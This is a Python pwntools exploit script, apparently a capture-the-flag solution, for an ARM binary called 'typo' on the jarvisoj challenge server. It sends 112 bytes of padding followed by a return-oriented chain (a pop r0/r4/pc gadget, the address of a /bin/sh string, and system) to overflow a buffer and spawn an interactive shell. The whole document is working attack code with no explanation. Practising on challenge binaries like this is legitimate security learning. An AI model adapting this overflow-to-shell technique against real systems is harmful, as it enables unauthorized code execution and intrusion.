from pwn import *
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import pdb
#  context.log_level = "debug"

if sys.argv[1] == "l":
	p = process("./typo", timeout = 2)
elif sys.argv[1] == "d":
	p = process(["qemu-arm", "-g", "1234", "./typo"])
else:
	p = remote("pwn2.jarvisoj.com", 9888, timeout = 2)

binsh_addr = 0x0006c384
pop_r0_r4_pc = 0x00020904
system_addr = 0x110B4
p.sendafter("quit\n", "\n")
p.recvline()
payload = "a"*112 + p32(pop_r0_r4_pc) + p32(binsh_addr) + "junk" + p32(system_addr)
p.sendline(payload)
p.interactive()
